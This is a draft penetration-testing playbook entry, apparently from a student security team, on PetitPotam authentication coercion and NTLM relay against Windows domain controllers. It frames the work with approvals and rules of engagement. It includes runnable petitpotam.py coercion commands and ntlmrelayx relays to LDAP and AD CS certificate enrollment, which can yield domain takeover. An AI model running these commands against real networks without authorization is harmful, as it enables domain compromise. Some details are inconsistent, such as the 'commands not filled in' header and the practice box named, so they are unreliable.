*Draft: command steps not filled in yet.*

# 8. PetitPotam

- **Phase:** No credentials (scan); Escalation (relay, with low credentials)
- **Risk:** The check is 🟡 Noisy. **The relay is 🔴 Risky: approval every time, and only if the RoE allows relaying.**
- **Tier:** Recognize
- **Finding:** part of L03 (`smb-signing-not-required`) or L12 (`adcs-vulnerable-template`), depending on where the relay lands (`training/technique-map.md`)
- **Runs on:** domain controllers, Server 2008 through 2022
- **Ports:** 135, 445
- **Tools:** PetitPotam.py (https://github.com/topotam/PetitPotam, https://github.com/raphajohnsec/PetitPotam-ly4k); ntlmrelayx.py (Impacket) for the relay
- **You need:** the AD domain name; for the relay, a username plus password or NTLM hash

## What it is
PetitPotam is an **authentication coercion**: a request that makes a Windows server, often a DC, log in to a machine the attacker controls. That login can be relayed to another service and accepted as the server's identity. If the target is a certificate server (AD CS), the result can be control of the domain.

It only becomes a takeover with a relay target that accepts it, which is why it pairs with #4 (SMB signing not required) and AD CS findings. The 2024 doc notes the relay fails when the target enforces signing.

The 2024 Runlist lists PetitPotam twice under Escalation; this playbook covers both rows.

## Commands

SCAN ONLY:

Terminal 1: 
```ntlmrelayx.py -smb2support```

Terminal 2:
```python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>```

EXPLOITATION ONLY:

```python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>```

Example relays:

```
ntlmrelayx.py -smb2support
ntlmrelayx.py -t ldap://<TARGET_IP> -smb2support
ntlmrelayx.py -t http://<TARGET_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```


## Evidence to capture
- `evidence/F-NNN-01.png`: the scan output showing the coercion request was accepted.
- `evidence/F-NNN-02.png`: if a relay was approved and run, the relay result.
- The logged commands with timestamps.

## Practice
- **HTB box:** Sauna
- **Walkthrough:** [[TODO: none in the 2024 doc; add a link]]

---
*Adapted from the CCSF 2024 Windows playbooks. Updated by the CCSF 2026 team.*
